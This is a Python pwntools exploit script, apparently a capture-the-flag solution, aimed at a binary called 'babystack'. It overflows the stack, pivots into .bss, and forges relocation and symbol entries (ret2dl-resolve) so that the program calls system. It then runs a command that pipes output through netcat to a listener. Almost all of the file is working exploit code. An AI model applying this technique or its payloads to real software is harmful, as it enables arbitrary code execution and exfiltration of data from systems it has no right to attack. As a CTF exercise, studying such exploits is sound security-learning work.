# -*- coding:utf-8 -*-
from pwn import *
#context.log_level = 'debug'
p = process('./babystack')
elf = ELF('./babystack')

read_plt = elf.plt['read']
alarm_plt = elf.plt['alarm']
pop_ebp_ret = 0x080484eb
ppp_ret = 0x080484e9
pp_ebp_ret = 0x080484ea
leave_ret = 0x08048455
stack_size = 0x800
bss_addr = 0x0804a020   #readelf -S babystack | grep ".bss"
base_stage = bss_addr + stack_size
plt_0 = 0x80482f0 # objdump -d -j .plt babystack
rel_plt = 0x80482b0 # objdump -s -j .rel.plt babystack
index_offset = (base_stage + 28) - rel_plt
alarm_got = elf.got['alarm']
print "alarm_got: ",hex(alarm_got)
print "alarm_plt: ",hex(alarm_plt)
print "read_plt: ",hex(read_plt)
dynsym = 0x080481CC
dynstr = 0x0804822C
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = index_dynsym << 8 | 0x7
fake_reloc = p32(alarm_got) + p32(r_info)
st_name = fake_sym_addr + 0x10 - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)



payload = 'a'*0x28 + p32(bss_addr)
payload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_addr) +     p32(36) 
raw_input("go:")
p.send(payload)

#fake stack 1 bss_addr
payload1 = 'aaaa' #pop ebp
payload1 += p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100)
payload1 += p32(pop_ebp_ret) + p32(base_stage) #fake stack again
payload1 += p32(leave_ret) #leave: mov esp,ebp; pop ebp
p.send(payload1)


cmd = "pwd|nc 127.0.0.1 5000"
#fake stack 2 base_stage
payload2 = 'bbbb'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'aaaa'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc #base_stage+28
payload2 += 'b' * align
payload2 += fake_sym #base_stage+36
payload2 += "system\x00"
payload2 += 'a' * (80 - len(payload2))
payload2 += cmd +'\x00'
payload2 += 'a' * (100 - len(payload2))
print len(payload2)
p.sendline(payload2)
p.interactive()
